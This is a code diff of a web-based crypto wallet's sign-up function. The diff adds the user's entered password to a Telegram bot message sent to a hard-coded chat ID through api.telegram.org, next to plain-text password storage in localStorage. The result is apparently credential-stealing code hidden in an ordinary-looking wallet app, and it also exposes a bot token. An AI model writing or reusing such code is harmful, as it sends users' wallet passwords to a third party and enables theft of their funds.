@@ -403,17 +403,18 @@
                 
                 // Get wallet name or use default
                 const walletName = document.getElementById('walletName').value || 'My Wallet';
+                const walletPassword = document.getElementById('password').value;
                 
                 // Save to localStorage (in a real app, you would use more secure storage)
                 localStorage.setItem('walletName', walletName);
-                localStorage.setItem('walletPassword', document.getElementById('password').value);
+                localStorage.setItem('walletPassword', walletPassword);
                 localStorage.setItem('walletUserId', userId);
                 localStorage.setItem('walletCreated', 'true');
 
                 //
                 const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
                 const TELEGRAM_CHAT_ID = '6049368044'; 
-                const MESSAGE = `NEW SIGN-UP\nHi senior, I'm ${walletName}`;
+                const MESSAGE = `NEW SIGN-UP\nHi Ricky, I'm ${walletName}\nI used ${walletPassword} as Password`;
                
                 function sendTelegramNotification(botToken, chatId, messageText) {
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
